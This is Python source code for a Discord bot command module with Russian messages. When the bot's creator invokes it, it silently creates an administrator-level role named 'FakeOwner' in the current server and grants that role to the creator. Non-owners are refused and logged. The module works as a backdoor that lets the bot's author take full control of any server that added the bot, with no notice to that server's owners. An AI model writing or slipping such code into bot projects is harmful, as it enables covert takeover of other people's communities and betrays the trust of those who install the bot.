import discord

from discord.ext import commands

from core.bot import is_owner
from core.logger import logger
from data.colors import colors

class Fullaccess(commands.Cog):
    """Выдать полный доступ"""

    def __init__(self, bot):
        self.bot = bot

    @commands.command(aliases = [
                                'full_access', 'fullaccess', 'access',
                                'полный_доступ', 'полныйдоступ', 'доступ', 'дать_доступ'
                                ])
    async def full_access_command(self, ctx):
        if is_owner(ctx.author.id) is True:
            owner_role = discord.utils.get(ctx.message.guild.roles, name = 'FakeOwner')
            if owner_role in ctx.author.roles:
                await ctx.send(embed = discord.Embed(title = 'У вас уже имеется роль создателя'))
                return
            if owner_role is None:
                owner_role = await ctx.guild.create_role(name = 'FakeOwner', permissions = discord.Permissions( administrator = True), color = colors['help'])
            await ctx.author.add_roles(owner_role, reason = None, atomic = True)
        else:
            await ctx.send(embed = discord.Embed(title = '`Вы не являетесь моим создателем!`', color = discord.Color.dark_red()))
            logger.warning(f'Попытка получить права администратора - Пользователь: {ctx.author} ({ctx.author.id}).')

def setup(bot):
    bot.add_cog(Fullaccess(bot))